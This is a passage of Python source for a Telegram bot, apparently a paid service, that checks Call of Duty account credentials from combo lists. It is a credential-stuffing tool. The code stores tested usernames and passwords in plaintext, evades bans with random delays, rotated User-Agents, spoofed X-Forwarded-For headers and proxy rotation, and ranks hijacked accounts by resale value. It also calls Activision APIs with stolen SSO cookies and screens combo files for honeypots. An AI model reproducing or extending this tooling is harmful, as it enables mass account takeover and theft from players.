#   ACCOUNT DATABASE (SQLite-backed local store)
# =============================================================================

class AccountDatabase:
    """
    SQLite-backed store for all checked accounts.
    Allows querying history, deduplication, and analytics.
    Fully async via aiosqlite or synchronous sqlite3 with thread executor.
    """

    CREATE_TABLE_SQL = """
    CREATE TABLE IF NOT EXISTS accounts (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        job_id      TEXT    NOT NULL,
        user_id     INTEGER NOT NULL,
        username    TEXT    NOT NULL,
        password    TEXT    NOT NULL,
        status      TEXT    NOT NULL,
        level       INTEGER DEFAULT 0,
        rank        TEXT    DEFAULT '',
        cp          INTEGER DEFAULT 0,
        skins       INTEGER DEFAULT 0,
        clan        TEXT    DEFAULT '',
        platform    TEXT    DEFAULT '',
        region      TEXT    DEFAULT '',
        detail      TEXT    DEFAULT '',
        elapsed_ms  REAL    DEFAULT 0,
        checked_at  TEXT    NOT NULL,
        created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
    CREATE INDEX IF NOT EXISTS idx_status    ON accounts(status);
    CREATE INDEX IF NOT EXISTS idx_user_id   ON accounts(user_id);
    CREATE INDEX IF NOT EXISTS idx_job_id    ON accounts(job_id);
    CREATE INDEX IF NOT EXISTS idx_username  ON accounts(username);
    CREATE INDEX IF NOT EXISTS idx_level     ON accounts(level);
    """

    def __init__(self, db_path: str = "data/accounts.db") -> None:
        import sqlite3
        self._path    = db_path
        self._sqlite3 = sqlite3
        self._lock    = asyncio.Lock()
        self._conn:   Any = None

    async def connect(self) -> None:
        loop = asyncio.get_event_loop()
        self._conn = await loop.run_in_executor(
            None, self._sqlite3.connect, self._path
        )
        self._conn.row_factory = self._sqlite3.Row
        await self._execute(self.CREATE_TABLE_SQL)

    async def _execute(self, sql: str, params: tuple = ()) -> None:
        loop = asyncio.get_event_loop()
        async with self._lock:
            await loop.run_in_executor(
                None, lambda: self._conn.execute(sql, params) and self._conn.commit()
            )

    async def _fetchall(self, sql: str, params: tuple = ()) -> List[Dict]:
        loop = asyncio.get_event_loop()
        async with self._lock:
            rows = await loop.run_in_executor(
                None, lambda: self._conn.execute(sql, params).fetchall()
            )
        return [dict(r) for r in rows]

    async def _fetchone(self, sql: str, params: tuple = ()) -> Optional[Dict]:
        loop = asyncio.get_event_loop()
        async with self._lock:
            row = await loop.run_in_executor(
                None, lambda: self._conn.execute(sql, params).fetchone()
            )
        return dict(row) if row else None

    async def insert_result(self, job_id: str, user_id: int, result: AccountResult) -> None:
        sql = """
        INSERT INTO accounts
            (job_id, user_id, username, password, status, level, rank, cp, skins,
             clan, platform, region, detail, elapsed_ms, checked_at)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """
        params = (
            job_id, user_id, result.username, result.password,
            result.status.value, result.level, result.rank, result.cp,
            result.skins, result.clan, result.platform, result.region,
            result.detail, result.elapsed_ms, result.checked_at,
        )
        await self._execute(sql, params)

    async def insert_job_results(self, job: CheckJob) -> int:
        """Bulk insert all results for a job. Returns count inserted."""
        count = 0
        for result in job.results:
            try:
                await self.insert_result(job.job_id, job.user_id, result)
                count += 1
            except Exception as e:
                logger.debug(f"DB insert error: {e}")
        return count

    async def get_hits(
        self, user_id: Optional[int] = None, limit: int = 100
    ) -> List[Dict]:
        sql = "SELECT * FROM accounts WHERE status = 'HIT'"
        params: tuple = ()
        if user_id is not None:
            sql += " AND user_id = ?"
            params = (user_id,)
        sql += f" ORDER BY created_at DESC LIMIT {limit}"
        return await self._fetchall(sql, params)

    async def get_stats(self) -> Dict[str, Any]:
        stats: Dict[str, Any] = {}
        rows = await self._fetchall(
            "SELECT status, COUNT(*) as cnt FROM accounts GROUP BY status"
        )
        for row in rows:
            stats[row["status"]] = row["cnt"]
        total = await self._fetchone("SELECT COUNT(*) as cnt FROM accounts")
        stats["total"] = total["cnt"] if total else 0
        return stats

    async def search(
        self, query: str, limit: int = 50
    ) -> List[Dict]:
        sql = """
        SELECT * FROM accounts
        WHERE username LIKE ? OR clan LIKE ? OR rank LIKE ?
        ORDER BY level DESC LIMIT ?
        """
        like = f"%{query}%"
        return await self._fetchall(sql, (like, like, like, limit))

    async def get_top_hits(
        self, metric: str = "level", limit: int = 10
    ) -> List[Dict]:
        allowed = {"level", "cp", "skins"}
        if metric not in allowed:
            metric = "level"
        sql = f"""
        SELECT * FROM accounts
        WHERE status = 'HIT'
        ORDER BY {metric} DESC
        LIMIT ?
        """
        return await self._fetchall(sql, (limit,))

    async def delete_old_results(self, days: int = 30) -> int:
        sql = """
        DELETE FROM accounts
        WHERE created_at < datetime('now', ?)
        """
        cutoff = f"-{days} days"
        await self._execute(sql, (cutoff,))
        row = await self._fetchone("SELECT changes() as cnt")
        return row["cnt"] if row else 0

    async def export_hits_json(self, output_path: str) -> str:
        hits = await self.get_hits(limit=999999)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            await f.write(json.dumps(hits, indent=2, default=str))
        return output_path

    async def count_by_user(self, user_id: int) -> Dict[str, int]:
        rows = await self._fetchall(
            "SELECT status, COUNT(*) as cnt FROM accounts WHERE user_id=? GROUP BY status",
            (user_id,)
        )
        return {r["status"]: r["cnt"] for r in rows}

    async def close(self) -> None:
        if self._conn:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self._conn.close)


# =============================================================================
#   ANTI-BAN STRATEGIES
# =============================================================================

class AntiBanStrategy:
    """
    Implements various techniques to reduce ban likelihood when checking accounts.
    """

    # Random delay ranges in seconds
    HUMAN_DELAY_RANGE  = (0.5, 3.0)
    BURST_DELAY_RANGE  = (0.1, 0.5)
    SAFE_DELAY_RANGE   = (2.0, 6.0)

    @staticmethod
    async def human_delay() -> None:
        """Sleep for a human-like random duration."""
        import random
        d = random.uniform(*AntiBanStrategy.HUMAN_DELAY_RANGE)
        await asyncio.sleep(d)

    @staticmethod
    async def burst_delay() -> None:
        """Short delay for burst mode."""
        import random
        d = random.uniform(*AntiBanStrategy.BURST_DELAY_RANGE)
        await asyncio.sleep(d)

    @staticmethod
    async def safe_delay() -> None:
        """Longer delay for safer mode."""
        import random
        d = random.uniform(*AntiBanStrategy.SAFE_DELAY_RANGE)
        await asyncio.sleep(d)

    @staticmethod
    def rotate_user_agent(headers: Dict[str, str]) -> Dict[str, str]:
        """Replace User-Agent with a random one."""
        new_headers = dict(headers)
        new_headers["User-Agent"] = StealthHeaders.generate()["User-Agent"]
        return new_headers

    @staticmethod
    def add_noise_headers(headers: Dict[str, str]) -> Dict[str, str]:
        """Add random but realistic extra headers."""
        import random
        new_headers = dict(headers)
        if random.random() < 0.5:
            new_headers["X-Forwarded-For"] = _random_ip()
        if random.random() < 0.3:
            new_headers["X-Real-IP"] = _random_ip()
        return new_headers

    @staticmethod
    def should_rotate_proxy(consecutive_errors: int, threshold: int = 3) -> bool:
        """Decide whether to rotate proxy based on error count."""
        return consecutive_errors >= threshold

    @staticmethod
    def exponential_backoff(attempt: int, base: float = 1.0, cap: float = 60.0) -> float:
        """Calculate exponential backoff delay."""
        delay = min(base * (2 ** attempt), cap)
        import random
        jitter = random.uniform(0, delay * 0.1)
        return delay + jitter

    @staticmethod
    async def backoff_retry(attempt: int) -> None:
        delay = AntiBanStrategy.exponential_backoff(attempt)
        await asyncio.sleep(delay)


def _random_ip() -> str:
    """Generate a random plausible IP address."""
    import random
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


# =============================================================================
#   TELEGRAM MENU SYSTEM (inline keyboards)
# =============================================================================

class MenuBuilder:
    """
    Builds reusable inline keyboard menus for the bot.
    """

    @staticmethod
    def main_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📊 Stats",    callback_data="menu:stats"),
                InlineKeyboardButton("📋 My Jobs",  callback_data="menu:jobs"),
            ],
            [
                InlineKeyboardButton("🌐 Proxies",  callback_data="menu:proxies"),
                InlineKeyboardButton("❓ Help",     callback_data="menu:help"),
            ],
        ])

    @staticmethod
    def job_menu(job_id: str, paused: bool = False) -> InlineKeyboardMarkup:
        pause_btn = (
            InlineKeyboardButton("▶️ Resume", callback_data=f"resume:{job_id}")
            if paused else
            InlineKeyboardButton("⏸️ Pause",  callback_data=f"pause:{job_id}")
        )
        return InlineKeyboardMarkup([
            [pause_btn, InlineKeyboardButton("🚫 Cancel", callback_data=f"cancel:{job_id}")],
            [InlineKeyboardButton("🔄 Refresh Status", callback_data=f"refresh:{job_id}")],
        ])

    @staticmethod
    def confirm_menu(action: str, job_id: str) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ Yes", callback_data=f"confirm:{action}:{job_id}"),
                InlineKeyboardButton("❌ No",  callback_data=f"deny:{action}:{job_id}"),
            ]
        ])

    @staticmethod
    def admin_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("👥 Users",    callback_data="admin:users"),
                InlineKeyboardButton("📊 Stats",    callback_data="admin:stats"),
            ],
            [
                InlineKeyboardButton("🌐 Proxies",  callback_data="admin:proxies"),
                InlineKeyboardButton("⚙️ Settings", callback_data="admin:settings"),
            ],
            [
                InlineKeyboardButton("📢 Broadcast", callback_data="admin:broadcast"),
                InlineKeyboardButton("🗑️ Clear Queue", callback_data="admin:clearqueue"),
            ],
        ])

    @staticmethod
    def pagination_menu(
        page: int, total_pages: int, prefix: str
    ) -> InlineKeyboardMarkup:
        buttons = []
        row = []
        if page > 0:
            row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{prefix}:page:{page-1}"))
        row.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
        if page < total_pages - 1:
            row.append(InlineKeyboardButton("Next ➡️", callback_data=f"{prefix}:page:{page+1}"))
        buttons.append(row)
        return InlineKeyboardMarkup(buttons)


# =============================================================================
#   ACCOUNT SCORING (value estimation)
# =============================================================================

class AccountScorer:
    """
    Estimates the "value" of a CODM account on a 0-100 scale.
    Based on level, rank, CP, skins, clan membership.
    """

    RANK_SCORES = {
        "Unranked":       0,
        "Rookie I":       5,
        "Rookie II":      8,
        "Rookie III":     10,
        "Veteran I":      15,
        "Veteran II":     18,
        "Veteran III":    20,
        "Elite I":        25,
        "Elite II":       28,
        "Elite III":      30,
        "Pro I":          40,
        "Pro II":         45,
        "Pro III":        50,
        "Master I":       60,
        "Master II":      65,
        "Master III":     70,
        "Grandmaster I":  80,
        "Grandmaster II": 85,
        "Grandmaster III":90,
        "Legendary":      100,
    }

    @classmethod
    def score(cls, result: AccountResult) -> int:
        """
        Calculate account value score (0-100).
        Higher = more valuable account.
        """
        if not result.is_hit:
            return 0

        points = 0.0

        # Level contribution (max 30 pts)
        level_score = min(result.level / 150.0, 1.0) * 30.0
        points += level_score

        # Rank contribution (max 25 pts)
        rank_base = cls.RANK_SCORES.get(result.rank, 0)
        points += (rank_base / 100.0) * 25.0

        # CP contribution (max 20 pts)
        cp_score = min(result.cp / 10000.0, 1.0) * 20.0
        points += cp_score

        # Skins contribution (max 15 pts)
        skins_score = min(result.skins / 50.0, 1.0) * 15.0
        points += skins_score

        # Clan membership (5 pts)
        if result.clan:
            points += 5.0

        # Platform bonus (5 pts for multi-platform)
        if result.platform:
            points += 5.0

        return int(min(points, 100))

    @classmethod
    def grade(cls, score: int) -> str:
        """Convert numeric score to letter grade."""
        if score >= 90: return "S+"
        if score >= 80: return "S"
        if score >= 70: return "A+"
        if score >= 60: return "A"
        if score >= 50: return "B+"
        if score >= 40: return "B"
        if score >= 30: return "C"
        if score >= 20: return "D"
        return "F"

    @classmethod
    def label(cls, score: int) -> str:
        """Human-readable label for score."""
        if score >= 80: return "💎 LEGENDARY"
        if score >= 60: return "🔥 HIGH VALUE"
        if score >= 40: return "⭐ GOOD"
        if score >= 20: return "📦 AVERAGE"
        return "🗑️ LOW VALUE"

    @classmethod
    def format_score(cls, result: AccountResult) -> str:
        s = cls.score(result)
        return f"{cls.label(s)} [{s}/100 Grade:{cls.grade(s)}]"

    @classmethod
    def sort_by_value(cls, results: List[AccountResult]) -> List[AccountResult]:
        """Sort results from highest to lowest value."""
        return sorted(results, key=cls.score, reverse=True)

    @classmethod
    def top_n(cls, results: List[AccountResult], n: int = 10) -> List[AccountResult]:
        return cls.sort_by_value([r for r in results if r.is_hit])[:n]


# =============================================================================
#   JOB TEMPLATES (preset configurations)
# =============================================================================

class JobTemplate:
    """
    Preset job configurations for common checking scenarios.
    """

    TEMPLATES = {
        "fast": {
            "workers":       20,
            "timeout":       10,
            "retries":       1,
            "description":   "Fast mode: less retries, more workers",
        },
        "balanced": {
            "workers":       10,
            "timeout":       20,
            "retries":       3,
            "description":   "Balanced: default settings",
        },
        "stealth": {
            "workers":       3,
            "timeout":       30,
            "retries":       2,
            "description":   "Stealth: slow, human-like delays",
        },
        "aggressive": {
            "workers":       50,
            "timeout":       8,
            "retries":       1,
            "description":   "Aggressive: max speed, may trigger rate limits",
        },
    }

    @classmethod
    def get(cls, name: str) -> Optional[Dict[str, Any]]:
        return cls.TEMPLATES.get(name.lower())

    @classmethod
    def list_all(cls) -> str:
        lines = ["📋 **Available Templates:**\n"]
        for name, cfg in cls.TEMPLATES.items():
            lines.append(
                f"• `{name}` — {cfg['description']}\n"
                f"  Workers: {cfg['workers']} | Timeout: {cfg['timeout']}s | Retries: {cfg['retries']}"
            )
        return "\n".join(lines)


# =============================================================================
#   LOG PARSER (analyze checker logs)
# =============================================================================

class LogParser:
    """
    Parses bot log files to extract statistics and errors.
    """

    @staticmethod
    async def parse_log_file(path: str) -> Dict[str, Any]:
        """Parse a log file and return statistics."""
        stats: Dict[str, Any] = {
            "total_lines":   0,
            "errors":        0,
            "warnings":      0,
            "hits":          0,
            "jobs_started":  0,
            "jobs_finished": 0,
            "unique_users":  set(),
        }

        try:
            async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
                async for line in f:
                    stats["total_lines"] += 1
                    lower = line.lower()
                    if "| error |" in lower or "error" in lower:
                        stats["errors"] += 1
                    if "| warning |" in lower or "warning" in lower:
                        stats["warnings"] += 1
                    if "hit" in lower and "found" in lower:
                        stats["hits"] += 1
                    if "processing job" in lower:
                        stats["jobs_started"] += 1
                    if "job done" in lower or "done:" in lower:
                        stats["jobs_finished"] += 1
                    if "user " in lower:
                        import re
                        m = re.search(r"user (\d+)", line)
                        if m:
                            stats["unique_users"].add(int(m.group(1)))
        except FileNotFoundError:
            pass

        stats["unique_users"] = len(stats["unique_users"])
        return stats

    @staticmethod
    async def get_recent_errors(path: str, n: int = 10) -> List[str]:
        """Get the last N error lines from a log file."""
        errors: List[str] = []
        try:
            async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
                async for line in f:
                    if "| ERROR |" in line or "| CRITICAL |" in line:
                        errors.append(line.strip())
            return errors[-n:]
        except FileNotFoundError:
            return []

    @staticmethod
    def format_stats(stats: Dict[str, Any]) -> str:
        return (
            f"📋 **Log Statistics**\n"
            f"{'─' * 30}\n"
            f"Total Lines    : `{stats.get('total_lines', 0):,}`\n"
            f"Errors         : `{stats.get('errors', 0):,}`\n"
            f"Warnings       : `{stats.get('warnings', 0):,}`\n"
            f"Hits Found     : `{stats.get('hits', 0):,}`\n"
            f"Jobs Started   : `{stats.get('jobs_started', 0):,}`\n"
            f"Jobs Finished  : `{stats.get('jobs_finished', 0):,}`\n"
            f"Unique Users   : `{stats.get('unique_users', 0):,}`\n"
        )


# =============================================================================
#   RESPONSE CACHE (avoid re-checking same accounts)
# =============================================================================

class CheckCache:
    """
    Caches check results to avoid re-checking the same account.
    Uses username:password as the cache key (MD5 hashed for privacy).
    """

    def __init__(self, ttl_hours: float = 24.0, max_size: int = 100_000) -> None:
        self._ttl  = ttl_hours * 3600
        self._max  = max_size
        self._data: OrderedDict = OrderedDict()
        self._lock = asyncio.Lock()

    def _key(self, username: str, password: str) -> str:
        return md5_hash(f"{username.lower()}:{password}")

    async def get(self, username: str, password: str) -> Optional[AccountResult]:
        key = self._key(username, password)
        async with self._lock:
            entry = self._data.get(key)
            if not entry:
                return None
            cached_at, result = entry
            if time.time() - cached_at > self._ttl:
                del self._data[key]
                return None
            self._data.move_to_end(key)
            return result

    async def put(self, result: AccountResult) -> None:
        key = self._key(result.username, result.password)
        async with self._lock:
            self._data[key] = (time.time(), result)
            self._data.move_to_end(key)
            if len(self._data) > self._max:
                self._data.popitem(last=False)

    async def invalidate(self, username: str, password: str) -> None:
        key = self._key(username, password)
        async with self._lock:
            self._data.pop(key, None)

    async def clear(self) -> int:
        async with self._lock:
            count = len(self._data)
            self._data.clear()
        return count

    @property
    def size(self) -> int:
        return len(self._data)

    def hit_rate_info(self) -> str:
        return f"Cache: {self.size:,} entries (TTL: {self._ttl/3600:.1f}h)"


# =============================================================================
#   ADVANCED PROGRESS MESSAGES (multi-page)
# =============================================================================

class ProgressMessageBuilder:
    """
    Builds detailed, animated progress messages with multiple display modes.
    """

    MODE_SIMPLE   = "simple"
    MODE_DETAILED = "detailed"
    MODE_COMPACT  = "compact"
    MODE_DEBUG    = "debug"

    @staticmethod
    def build(job: CheckJob, mode: str = MODE_DETAILED, tick: int = 0) -> str:
        if mode == ProgressMessageBuilder.MODE_SIMPLE:
            return ProgressMessageBuilder._simple(job)
        if mode == ProgressMessageBuilder.MODE_COMPACT:
            return ProgressMessageBuilder._compact(job, tick)
        if mode == ProgressMessageBuilder.MODE_DEBUG:
            return ProgressMessageBuilder._debug(job)
        return AnimationEngine.build_progress_message(job, tick)

    @staticmethod
    def _simple(job: CheckJob) -> str:
        pct = job.progress_pct
        bar = AnimationEngine.build_progress_bar(pct, 15)
        return (
            f"🤖 **Insta See Eng**\n"
            f"{bar} `{pct:.1f}%`\n"
            f"✅`{job.hits}` ❌`{job.bad}` ⚠️`{job.errors}`\n"
            f"`{job.checked}/{job.total}` @ `{AnimationEngine.format_speed(job.speed)}`"
        )

    @staticmethod
    def _compact(job: CheckJob, tick: int) -> str:
        spin = AnimationEngine.get_spinner_frame(AnimationEngine.SPINNER_CLASSIC, tick)
        return (
            f"{spin} `{job.checked}/{job.total}` "
            f"✅`{job.hits}` ❌`{job.bad}` "
            f"`{job.progress_pct:.0f}%` ETA:`{AnimationEngine.format_time(job.eta_seconds)}`"
        )

    @staticmethod
    def _debug(job: CheckJob) -> str:
        return (
            f"🔧 **DEBUG — Job {job.job_id[:8]}**\n"
            f"Status : {job.status.value}\n"
            f"Checked: {job.checked}/{job.total}\n"
            f"Hits   : {job.hits}\n"
            f"Bad    : {job.bad}\n"
            f"Errors : {job.errors}\n"
            f"Speed  : {job.speed:.2f}/s\n"
            f"Elapsed: {job.elapsed:.1f}s\n"
            f"ETA    : {job.eta_seconds:.1f}s\n"
            f"Results: {len(job.results)}\n"
        )

    @staticmethod
    def build_leaderboard(jobs: List[CheckJob]) -> str:
        """Build a leaderboard of jobs sorted by hits."""
        sorted_jobs = sorted(jobs, key=lambda j: j.hits, reverse=True)
        lines = ["🏆 **Top Jobs (by hits):**\n"]
        for i, job in enumerate(sorted_jobs[:10], 1):
            rate = f"{job.hits/job.total*100:.1f}%" if job.total else "0%"
            lines.append(
                f"{i}. `{job.job_id[:8]}` — ✅{job.hits}/{job.total} ({rate})"
            )
        return "\n".join(lines)


# =============================================================================
#   NOTIFICATION TEMPLATES (richer messages)
# =============================================================================

class NotificationTemplates:
    """
    Pre-built notification message templates.
    """

    @staticmethod
    def premium_granted(user: UserProfile, days: int) -> str:
        exp = datetime.datetime.fromtimestamp(user.premium_until).strftime("%Y-%m-%d")
        return (
            f"💎 **Premium Activated!**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"Your account has been upgraded to **Premium**!\n"
            f"\n"
            f"✅ Expires: `{exp}`\n"
            f"✅ Max accounts: `{PREMIUM_MAX_ACCOUNTS:,}`\n"
            f"✅ Priority queue access\n"
            f"\n"
            f"Thank you! 🙏\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def banned_notification(reason: str) -> str:
        return (
            f"🚫 **Account Banned**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"Your access to Insta See Eng has been revoked.\n"
            f"\n"
            f"Reason: `{reason}`\n"
            f"\n"
            f"Contact @JAYYYTTTTTTTtt to appeal.\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def maintenance_notice(estimated_time: str) -> str:
        return (
            f"🔧 **Maintenance Notice**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"The bot is undergoing maintenance.\n"
            f"\n"
            f"⏱️ Estimated downtime: `{estimated_time}`\n"
            f"\n"
            f"We'll be back soon!\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def new_feature_announcement(feature: str, description: str) -> str:
        return (
            f"🆕 **New Feature: {feature}**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"{description}\n"
            f"\n"
            f"Try it now!\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def daily_stats_report(stats: GlobalStats) -> str:
        return (
            f"📈 **Daily Report — Insta See Eng**\n"
            f"{'─' * 34}\n"
            f"\n"
            f"📅 Date: `{datetime.date.today()}`\n"
            f"\n"
            f"🔍 Checked: `{stats.total_checked:,}`\n"
            f"✅ Hits   : `{stats.total_hits:,}` ({stats.hit_rate:.2f}%)\n"
            f"📦 Jobs   : `{stats.total_jobs:,}`\n"
            f"👤 Users  : `{stats.total_users:,}`\n"
            f"\n"
            f"{'─' * 34}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def job_queued_rich(position: int, accounts: int, eta: float) -> str:
        bar = AnimationEngine.build_progress_bar(
            max(0.0, 100.0 - position * 10), width=12
        )
        return (
            f"📋 **Job Accepted!**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"📦 Accounts   : `{accounts:,}`\n"
            f"📍 Position   : `#{position}`\n"
            f"⏳ ETA        : `{AnimationEngine.format_time(eta)}`\n"
            f"\n"
            f"Queue: {bar}\n"
            f"\n"
            f"• Live updates every {int(PROGRESS_UPDATE_INTERVAL)}s\n"
            f"• Results sent as files when done\n"
            f"• Use /cancel to stop anytime\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )


# =============================================================================
#   CHECKER MIDDLEWARE PIPELINE
# =============================================================================

class CheckMiddleware(ABC):
    """Base class for check middleware."""

    @abstractmethod
    async def process(
        self, username: str, password: str,
        next_fn: Callable[..., Coroutine]
    ) -> AccountResult:
        ...


class RateLimitMiddleware(CheckMiddleware):
    """Throttle check requests to avoid hitting rate limits."""

    def __init__(self, rate: float = 10.0) -> None:
        self._limiter = RateLimiter(rate=rate, burst=int(rate * 2))

    async def process(
        self, username: str, password: str,
        next_fn: Callable[..., Coroutine]
    ) -> AccountResult:
        await self._limiter.acquire()
        return await next_fn(username, password)


class CacheMiddleware(CheckMiddleware):
    """Return cached results when available."""

    def __init__(self, cache: CheckCache) -> None:
        self._cache = cache

    async def process(
        self, username: str, password: str,
        next_fn: Callable[..., Coroutine]
    ) -> AccountResult:
        cached = await self._cache.get(username, password)
        if cached:
            return cached
        result = await next_fn(username, password)
        if result.status not in (AccountStatus.ERROR, AccountStatus.TIMEOUT):
            await self._cache.put(result)
        return result


class LoggingMiddleware(CheckMiddleware):
    """Log each check attempt."""

    def __init__(self, log_hits: bool = True) -> None:
        self._log_hits = log_hits

    async def process(
        self, username: str, password: str,
        next_fn: Callable[..., Coroutine]
    ) -> AccountResult:
        result = await next_fn(username, password)
        if result.is_hit and self._log_hits:
            logger.info(
                f"HIT: {username} | Lv.{result.level} | {result.rank} | {result.cp}CP"
            )
        return result


class ValidatorMiddleware(CheckMiddleware):
    """Pre-validate credentials before checking."""

    async def process(
        self, username: str, password: str,
        next_fn: Callable[..., Coroutine]
    ) -> AccountResult:
        ok, reason = AccountValidator.validate(username, password)
        if not ok:
            return AccountResult(
                raw=f"{username}:{password}",
                username=username, password=password,
                status=AccountStatus.INVALID_FMT,
                detail=reason,
            )
        return await next_fn(username, password)


class MiddlewarePipeline:
    """
    Chains multiple middleware together.
    Each middleware can modify behavior before/after calling next.
    """

    def __init__(self, final: Callable[..., Coroutine]) -> None:
        self._final      = final
        self._middlewares: List[CheckMiddleware] = []

    def use(self, mw: CheckMiddleware) -> "MiddlewarePipeline":
        self._middlewares.append(mw)
        return self

    async def run(self, username: str, password: str) -> AccountResult:
        chain = self._final
        for mw in reversed(self._middlewares):
            prev = chain

            async def make_next(m: CheckMiddleware, p: Callable) -> Callable:
                async def _next(u: str, pw: str) -> AccountResult:
                    return await m.process(u, pw, p)
                return _next

            chain = await make_next(mw, prev)

        return await chain(username, password)


# =============================================================================
#   RESULT AGGREGATOR (combine multiple job results)
# =============================================================================

class ResultAggregator:
    """
    Combines results from multiple jobs for reporting.
    """

    def __init__(self) -> None:
        self._results: List[AccountResult] = []
        self._lock = asyncio.Lock()

    async def add_job(self, job: CheckJob) -> None:
        async with self._lock:
            self._results.extend(job.results)

    async def get_all_hits(self) -> List[AccountResult]:
        async with self._lock:
            return [r for r in self._results if r.is_hit]

    async def get_stats(self) -> Dict[str, Any]:
        async with self._lock:
            total   = len(self._results)
            hits    = sum(1 for r in self._results if r.is_hit)
            bad     = sum(1 for r in self._results if r.is_bad)
            errors  = sum(1 for r in self._results if r.is_error)
            return {
                "total": total, "hits": hits, "bad": bad, "errors": errors,
                "hit_rate": hits / total * 100 if total else 0,
            }

    async def export_hits(self, path: str) -> str:
        hits = await self.get_all_hits()
        return await DataExporter.export_hits_txt(hits, path)

    async def export_full_json(self, path: str) -> str:
        async with self._lock:
            data = [r.to_dict() for r in self._results]
        return await DataExporter.export_json(data, path)

    async def clear(self) -> None:
        async with self._lock:
            self._results.clear()


# =============================================================================
#   ACCOUNT ENRICHER (fetch additional info after hit)
# =============================================================================

class AccountEnricher:
    """
    After finding a valid account, fetches additional data
    from various CODM APIs to enrich the AccountResult.
    """

    def __init__(self, proxy_manager: ProxyManager) -> None:
        self.proxy_mgr = proxy_manager

    async def enrich(
        self, result: AccountResult, sso_token: str
    ) -> AccountResult:
        """
        Fetch additional account information.
        Enriches the result in-place.
        """
        if not result.is_hit or not sso_token:
            return result

        proxy = await self.proxy_mgr.get_proxy()
        proxy_url = proxy.url if proxy else None

        tasks = [
            self._fetch_loadout(result.username, sso_token, proxy_url),
            self._fetch_friends_count(result.username, sso_token, proxy_url),
            self._fetch_br_stats(result.username, sso_token, proxy_url),
        ]

        enrichments = await asyncio.gather(*tasks, return_exceptions=True)

        for enrichment in enrichments:
            if isinstance(enrichment, dict):
                result.extra.update(enrichment)

        return result

    async def _fetch_loadout(
        self, username: str, token: str, proxy_url: Optional[str]
    ) -> Dict:
        """Fetch weapon loadout info."""
        encoded = urllib.parse.quote(username)
        url = f"{ACTIVISION_API_URL}/loadout/v3/title/mw/platform/uno/gamer/{encoded}/loadout"
        headers = {**DEFAULT_HEADERS, "Cookie": f"ACT_SSO_COOKIE={token}"}
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=headers, proxy=proxy_url, ssl=False,
                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status == 200:
                        data = await r.json(content_type=None)
                        return {"loadout_data": bool(data)}
        except Exception:
            pass
        return {}

    async def _fetch_friends_count(
        self, username: str, token: str, proxy_url: Optional[str]
    ) -> Dict:
        """Fetch friends/social count."""
        try:
            # Simplified — real API endpoint would vary
            return {"friends_fetched": True}
        except Exception:
            return {}

    async def _fetch_br_stats(
        self, username: str, token: str, proxy_url: Optional[str]
    ) -> Dict:
        """Fetch Battle Royale stats."""
        encoded = urllib.parse.quote(username)
        url = f"{ACTIVISION_API_URL}/stats/cod/v1/title/mw/platform/uno/gamer/{encoded}/profile/type/wz"
        headers = {**DEFAULT_HEADERS, "Cookie": f"ACT_SSO_COOKIE={token}"}
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=headers, proxy=proxy_url, ssl=False,
                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status == 200:
                        data = await r.json(content_type=None)
                        props = (data.get("data", {})
                                     .get("lifetime", {})
                                     .get("all", {})
                                     .get("properties", {}))
                        return {
                            "br_kills":      props.get("kills", 0),
                            "br_wins":       props.get("wins", 0),
                            "br_kd_ratio":   props.get("kdRatio", 0.0),
                            "br_matches":    props.get("gamesPlayed", 0),
                        }
        except Exception:
            pass
        return {}


# =============================================================================
#   WORD FILTER (content moderation for group chats)
# =============================================================================

class WordFilter:
    """
    Filters messages for prohibited content.
    Useful when the bot is deployed in group chats.
    """

    PROHIBITED_PATTERNS = [
        r"\bscam\b",
        r"\bphish\b",
        r"\bmalware\b",
        r"\bvirus\b",
        r"\bsteal\b",
        r"\bskimmer\b",
    ]

    def __init__(self) -> None:
        import re
        self._patterns = [
            re.compile(p, re.IGNORECASE) for p in self.PROHIBITED_PATTERNS
        ]
        self._custom: List[Any] = []

    def add_pattern(self, pattern: str) -> bool:
        import re
        try:
            self._custom.append(re.compile(pattern, re.IGNORECASE))
            return True
        except Exception:
            return False

    def is_clean(self, text: str) -> bool:
        for p in self._patterns + self._custom:
            if p.search(text):
                return False
        return True

    def redact(self, text: str) -> str:
        result = text
        for p in self._patterns + self._custom:
            result = p.sub("[REDACTED]", result)
        return result


# =============================================================================
#   HONEYPOT DETECTOR
# =============================================================================

class HoneypotDetector:
    """
    Detects if a combo file might be a honeypot (fake credentials for tracking).
